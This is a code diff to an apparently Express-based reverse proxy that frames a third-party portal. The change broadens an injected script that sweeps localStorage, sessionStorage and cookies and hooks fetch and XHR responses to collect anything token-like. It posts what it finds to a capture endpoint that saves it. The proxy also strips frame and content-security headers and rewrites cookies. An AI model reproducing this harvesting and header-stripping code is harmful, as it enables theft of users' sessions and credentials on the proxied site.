@@ -25,8 +25,41 @@ declare module 'express-session' {
 const TOKEN_CAPTURE_SCRIPT = `
 <script>
 (function(){
-  const KEYS=['token','access_token','accessToken','jwt','id_token','bearer_token','authToken','auth_token','userToken','api_token','nexus_session','session','sid'];
+  // Key name patterns that suggest an auth credential
+  const KEY_PATTERNS = [
+    /token/i, /session/i, /auth/i, /jwt/i, /bearer/i,
+    /credential/i, /secret/i, /api[_-]?key/i, /access/i,
+    /^sid$/i, /^id$/i, /^key$/i,
+  ];
+  // A value looks like a credential if it's a JWT, a long opaque string, or a UUID-like value
+  function looksLikeToken(v) {
+    if (typeof v !== 'string') return false;
+    if (v.length < 8) return false;
+    if (v.startsWith('eyJ')) return true;                          // JWT
+    if (/^[A-Za-z0-9+/=_\-]{20,}$/.test(v)) return true;         // opaque token / base64
+    if (/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(v)) return true; // UUID
+    return false;
+  }
+  function keyMatches(k) {
+    return KEY_PATTERNS.some(p => p.test(k));
+  }
+  // Recursively walk a plain object looking for token-like values
+  function walkObject(obj, path, found) {
+    if (!obj || typeof obj !== 'object') return;
+    for (const k of Object.keys(obj)) {
+      const v = obj[k];
+      const p = path ? path+'.'+k : k;
+      if (typeof v === 'string' && (keyMatches(k) || looksLikeToken(v)) && looksLikeToken(v)) {
+        found.push([p, v]);
+      } else if (v && typeof v === 'object' && !Array.isArray(v)) {
+        walkObject(v, p, found);
+      }
+    }
+  }
+  const sent = new Set();
   function send(token, source){
+    if (sent.has(token)) return;
+    sent.add(token);
     fetch('/api/auth/capture-token',{
       method:'POST',
       headers:{'Content-Type':'application/json'},
@@ -34,68 +67,80 @@ const TOKEN_CAPTURE_SCRIPT = `
       body:JSON.stringify({token, source})
     }).catch(()=>{});
   }
-  function scan(){
-    // Scan all localStorage keys
+  function scanStorage(storage, label) {
     try {
-      for(let i=0; i<localStorage.length; i++){
-        const k=localStorage.key(i);
-        const v=localStorage.getItem(k);
-        if(v && (KEYS.includes(k.toLowerCase()) || v.startsWith('eyJ')) && v.length>10){
-          send(v,'localStorage:'+k);
-          return true;
+      for (let i = 0; i < storage.length; i++) {
+        const k = storage.key(i);
+        const raw = storage.getItem(k);
+        if (!raw) continue;
+        // Try to parse as JSON — the token may be inside a stored object
+        if (raw.startsWith('{') || raw.startsWith('[')) {
+          try {
+            const parsed = JSON.parse(raw);
+            const found = [];
+            walkObject(parsed, k, found);
+            for (const [p, v] of found) send(v, label+':'+p);
+          } catch(e) {}
+        }
+        // Also check the raw string itself
+        if ((keyMatches(k) || looksLikeToken(raw)) && looksLikeToken(raw)) {
+          send(raw, label+':'+k);
         }
       }
-    }catch(e){}
-    // Scan all sessionStorage keys
-    try {
-      for(let i=0; i<sessionStorage.length; i++){
-        const k=sessionStorage.key(i);
-        const v=sessionStorage.getItem(k);
-        if(v && (KEYS.includes(k.toLowerCase()) || v.startsWith('eyJ')) && v.length>10){
-          send(v,'sessionStorage:'+k);
-          return true;
-        }
-      }
-    }catch(e){}
-    // Check cookies for known names or JWT values
-    document.cookie.split(';').forEach(c=>{
-      const [name,val]=(c.trim()).split('=');
-      const cleanName = name?.trim();
-      const cleanVal = decodeURIComponent(val || '').trim();
-      if((KEYS.includes(cleanName.toLowerCase()) || cleanVal.startsWith('eyJ')) && cleanVal.length>10){
-        send(cleanVal,'cookie:'+cleanName);
+    } catch(e) {}
+  }
+  function scanCookies() {
+    document.cookie.split(';').forEach(c => {
+      const eq = c.indexOf('=');
+      if (eq < 0) return;
+      const name = c.slice(0, eq).trim();
+      const val  = decodeURIComponent(c.slice(eq + 1).trim());
+      if ((keyMatches(name) || looksLikeToken(val)) && looksLikeToken(val)) {
+        send(val, 'cookie:'+name);
       }
     });
-    return false;
   }
-  if(!scan()){
-    const t=setInterval(()=>{ if(scan()) clearInterval(t); },800);
-    setTimeout(()=>clearInterval(t),600000);
+  function scan() {
+    const before = sent.size;
+    scanStorage(localStorage, 'localStorage');
+    scanStorage(sessionStorage, 'sessionStorage');
+    scanCookies();
+    return sent.size > before;
   }
-  // Also intercept XHR/fetch responses for tokens in JSON bodies
-  const origFetch=window.fetch;
-  window.fetch=async function(...args){
-    const res=await origFetch.apply(this,args);
-    try{
-      const clone=res.clone();
-      const ct=res.headers.get('content-type')||'';
-      if(ct.includes('application/json')){
-        clone.json().then(data=>{
-          for(const k of KEYS){
-            if(data[k] && typeof data[k]==='string' && data[k].length>10){ send(data[k],'fetchResponse:'+k); break; }
-            if(data.data && data.data[k] && typeof data.data[k]==='string'){ send(data.data[k],'fetchResponse:data.'+k); break; }
-          }
-          // Also scan JSON for any value starting with eyJ
-          for(const key in data){
-            if(typeof data[key]==='string' && data[key].startsWith('eyJ')){
-              send(data[key],'fetchResponse:jwt:'+key);
-              break;
-            }
-          }
+  scan();
+  const t = setInterval(() => { scan(); }, 1200);
+  setTimeout(() => clearInterval(t), 600000);
+  // Intercept fetch responses — scan the JSON body for tokens
+  const origFetch = window.fetch;
+  window.fetch = async function(...args) {
+    const res = await origFetch.apply(this, args);
+    try {
+      const ct = res.headers.get('content-type') || '';
+      if (ct.includes('application/json')) {
+        res.clone().json().then(data => {
+          const found = [];
+          walkObject(data, '', found);
+          for (const [p, v] of found) send(v, 'fetchResponse:'+p);
         }).catch(()=>{});
       }
-    }catch(e){}
+    } catch(e) {}
     return res;
+  };
+  // Intercept XHR responses
+  const origOpen = XMLHttpRequest.prototype.open;
+  XMLHttpRequest.prototype.open = function(...args) {
+    this.addEventListener('load', function() {
+      try {
+        const ct = this.getResponseHeader('content-type') || '';
+        if (ct.includes('application/json') && this.responseText) {
+          const data = JSON.parse(this.responseText);
+          const found = [];
+          walkObject(data, '', found);
+          for (const [p, v] of found) send(v, 'xhrResponse:'+p);
+        }
+      } catch(e) {}
+    });
+    return origOpen.apply(this, args);
   };
 })();
 </script>`;
@@ -236,7 +281,7 @@ app.post('/api/auth/login', async (req: Request, res: Response) => {
   req.session!.authToken = token;
   req.session!.proxyTarget = authBase.replace(/\/$/, '');
   res.cookie('proxyTarget', authBase.replace(/\/$/, ''), { sameSite: 'lax', maxAge: 7 * 24 * 60 * 60 * 1000 });
-  try { saveToken(token); } catch(e){}
+  try { saveToken(token); } catch (e) { }
   return res.json({ success: true, token });
 });
 
@@ -245,12 +290,12 @@ app.post('/api/auth/set-token', (req: Request, res: Response) => {
   if (!token) return res.status(400).json({ success: false, message: 'Missing token' });
   res.cookie('authToken', token, { httpOnly: true, sameSite: 'lax', maxAge: 7 * 24 * 60 * 60 * 1000 });
   req.session!.authToken = token;
-  try { saveToken(token); } catch(e){}
+  try { saveToken(token); } catch (e) { }
   return res.json({ success: true });
 });
 
 app.post('/api/auth/logout', (req: Request, res: Response) => {
-  req.session.destroy(() => {});
+  req.session.destroy(() => { });
   res.clearCookie('authToken');
   res.clearCookie('proxyTarget');
   return res.json({ success: true });
@@ -291,7 +336,7 @@ app.post('/api/auth/capture-token', (req: Request, res: Response) => {
   if (req.session!.proxyTarget) {
     res.cookie('proxyTarget', req.session!.proxyTarget, { sameSite: 'lax', maxAge: 7 * 24 * 60 * 60 * 1000 });
   }
-  try { saveToken(token); } catch(e){}
+  try { saveToken(token); } catch (e) { }
   return res.json({ success: true });
 });
 
@@ -309,9 +354,9 @@ function buildProxy(target: string, stripPrefix?: string) {
       },
       proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
         // Eliminar headers que bloquean el iframe
-        delete (proxyRes.headers as Record<string,any>)['x-frame-options'];
-        delete (proxyRes.headers as Record<string,any>)['content-security-policy'];
-        delete (proxyRes.headers as Record<string,any>)['x-content-security-policy'];
+        delete (proxyRes.headers as Record<string, any>)['x-frame-options'];
+        delete (proxyRes.headers as Record<string, any>)['content-security-policy'];
+        delete (proxyRes.headers as Record<string, any>)['x-content-security-policy'];
 
         // Rewrite Set-Cookie headers from the target portal:
         // - strip Domain/Secure/Path/SameSite=None so cookies work on localhost
@@ -322,11 +367,11 @@ function buildProxy(target: string, stripPrefix?: string) {
             : [proxyRes.headers['set-cookie']];
           proxyRes.headers['set-cookie'] = cookies.map((c: string) => {
             let clean = c.replace(/;\s*Domain=[^;]*/gi, '')
-                         .replace(/;\s*Secure/gi, '')
-                         .replace(/;\s*Path=[^;]*/gi, '')
-                         .replace(/;\s*SameSite=[^;]*/gi, '')
-                         .replace(/;\s*Max-Age=[^;]*/gi, '')
-                         .replace(/;\s*Expires=[^;]*/gi, '');
+              .replace(/;\s*Secure/gi, '')
+              .replace(/;\s*Path=[^;]*/gi, '')
+              .replace(/;\s*SameSite=[^;]*/gi, '')
+              .replace(/;\s*Max-Age=[^;]*/gi, '')
+              .replace(/;\s*Expires=[^;]*/gi, '');
             return clean + '; Path=/; SameSite=Lax; Max-Age=604800';
           });
         }
@@ -350,7 +395,7 @@ function buildProxy(target: string, stripPrefix?: string) {
         // Capturar tokens de cookies del upstream
         const setCookies = proxyRes.headers['set-cookie'] || [];
         const cookieArr = Array.isArray(setCookies) ? setCookies : [setCookies];
-        const tokenCookieNames = ['token','access_token','accessToken','jwt','auth_token','authToken','id_token','nexus_session','session','sid'];
+        const tokenCookieNames = ['token', 'access_token', 'accessToken', 'jwt', 'auth_token', 'authToken', 'id_token', 'nexus_session', 'session', 'sid'];
         for (const cookieStr of cookieArr) {
           if (!cookieStr) continue;
           const [pair] = (cookieStr as string).split(';');
@@ -363,7 +408,7 @@ function buildProxy(target: string, stripPrefix?: string) {
             if (!(req as any).session?.authToken) {
               (req as any).session!.authToken = val;
               (res as any).cookie('authToken', val, { httpOnly: true, sameSite: 'lax', maxAge: 7 * 24 * 60 * 60 * 1000 });
-              try { saveToken(val); } catch(e){}
+              try { saveToken(val); } catch (e) { }
               console.log(`[Proxy Token Capture] Captured token from cookie "${name}"`);
             }
           }
@@ -431,7 +476,7 @@ app.use((req: Request, res: Response, next: NextFunction) => {
     console.log(`[Proxy Fallback] request: ${req.method} ${req.url} -> Target: ${target}`);
     return buildProxy(target)(req, res, next);
   }
-  
+
   console.log(`[SPA Fallback Skip] request: ${req.method} ${req.url} (No target in session)`);
   next();
 });
